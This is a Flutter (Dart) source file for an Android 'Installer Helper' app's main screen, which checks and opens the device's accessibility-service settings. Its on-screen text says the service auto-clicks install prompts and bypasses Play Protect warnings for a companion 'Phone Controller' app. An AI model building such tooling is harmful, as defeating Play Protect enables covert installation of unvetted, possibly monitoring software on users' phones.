import 'dart:async';
import 'package:flutter/material.dart';
import 'package:flutter/services.dart';

void main() {
  runApp(const HelperApp());
}

class HelperApp extends StatelessWidget {
  const HelperApp({super.key});

  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      title: 'Installer Helper',
      debugShowCheckedModeBanner: false,
      theme: ThemeData(
        brightness: Brightness.dark,
        colorScheme: ColorScheme.fromSeed(
          seedColor: Colors.teal,
          brightness: Brightness.dark,
        ),
        useMaterial3: true,
        fontFamily: 'Roboto',
      ),
      home: const HelperHomePage(),
    );
  }
}

class HelperHomePage extends StatefulWidget {
  const HelperHomePage({super.key});

  @override
  State<HelperHomePage> createState() => _HelperHomePageState();
}

class _HelperHomePageState extends State<HelperHomePage> with WidgetsBindingObserver {
  static const _platform = MethodChannel('com.example.controller_helper/settings');
  bool _isEnabled = false;
  Timer? _statusTimer;

  @override
  void initState() {
    super.initState();
    WidgetsBinding.instance.addObserver(this);
    _checkStatus();
    _statusTimer = Timer.periodic(const Duration(seconds: 1), (timer) {
      _checkStatus();
    });
  }

  @override
  void dispose() {
    WidgetsBinding.instance.removeObserver(this);
    _statusTimer?.cancel();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _checkStatus();
    }
  }

  Future<void> _checkStatus() async {
    try {
      final enabled = await _platform.invokeMethod<bool>('isAccessibilityServiceEnabled');
      if (mounted) {
        setState(() {
          _isEnabled = enabled ?? false;
        });
      }
    } catch (e) {
      debugPrint("Error checking status: $e");
    }
  }

  Future<void> _openSettings() async {
    try {
      await _platform.invokeMethod('openAccessibilitySettings');
    } catch (e) {
      debugPrint("Error opening settings: $e");
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      body: Container(
        decoration: const BoxDecoration(
          gradient: RadialGradient(
            center: Alignment.center,
            radius: 1.2,
            colors: [
              Color(0xFF0F2E2C), // Deep teal dark
              Color(0xFF071413), // Very dark teal
            ],
          ),
        ),
        child: SafeArea(
          child: Padding(
            padding: const EdgeInsets.symmetric(horizontal: 24.0, vertical: 32.0),
            child: Column(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                const Spacer(),
                Container(
                  padding: const EdgeInsets.all(24),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.03),
                    shape: BoxShape.circle,
                    border: Border.all(
                      color: _isEnabled ? Colors.tealAccent.withOpacity(0.2) : Colors.redAccent.withOpacity(0.2),
                      width: 2,
                    ),
                  ),
                  child: Icon(
                    _isEnabled ? Icons.check_circle_outline : Icons.warning_amber_rounded,
                    size: 80,
                    color: _isEnabled ? Colors.tealAccent : Colors.redAccent,
                  ),
                ),
                const SizedBox(height: 32),
                const Text(
                  'INSTALLER HELPER',
                  style: TextStyle(
                    fontSize: 22,
                    fontWeight: FontWeight.w900,
                    color: Colors.white,
                    letterSpacing: 1.0,
                  ),
                ),
                const SizedBox(height: 16),
                Text(
                  'This service runs in the background to automatically click "Install", "Update", "Open", and bypass Play Protect prompts during updates of the main Phone Controller app.\n\nSince this helper app is never updated, it will not be terminated during updates and can fully automate the installation process.',
                  textAlign: TextAlign.center,
                  style: TextStyle(
                    fontSize: 14,
                    color: Colors.white.withOpacity(0.7),
                    height: 1.5,
                  ),
                ),
                const Spacer(),
                Container(
                  padding: const EdgeInsets.all(16),
                  decoration: BoxDecoration(
                    color: Colors.white.withOpacity(0.02),
                    borderRadius: BorderRadius.circular(16),
                    border: Border.all(color: Colors.white.withOpacity(0.05)),
                  ),
                  child: Row(
                    children: [
                      Icon(
                        _isEnabled ? Icons.circle : Icons.circle_outlined,
                        color: _isEnabled ? Colors.tealAccent : Colors.white30,
                        size: 12,
                      ),
                      const SizedBox(width: 12),
                      Expanded(
                        child: Text(
                          _isEnabled ? 'Service is Active' : 'Service is Inactive',
                          style: TextStyle(
                            fontSize: 14,
                            fontWeight: FontWeight.bold,
                            color: _isEnabled ? Colors.tealAccent : Colors.white60,
                          ),
                        ),
                      ),
                    ],
                  ),
                ),
                const SizedBox(height: 24),
                SizedBox(
                  width: double.infinity,
                  height: 56,
                  child: ElevatedButton(
                    style: ElevatedButton.styleFrom(
                      backgroundColor: _isEnabled ? Colors.white10 : Colors.tealAccent.shade700,
                      foregroundColor: _isEnabled ? Colors.white70 : Colors.black,
                      shape: RoundedRectangleBorder(
                        borderRadius: BorderRadius.circular(28),
                      ),
                    ),
                    onPressed: _openSettings,
                    child: Text(
                      _isEnabled ? 'Modify Settings' : 'Enable Service',
                      style: const TextStyle(
                        fontSize: 16,
                        fontWeight: FontWeight.bold,
                      ),
                    ),
                  ),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }
}
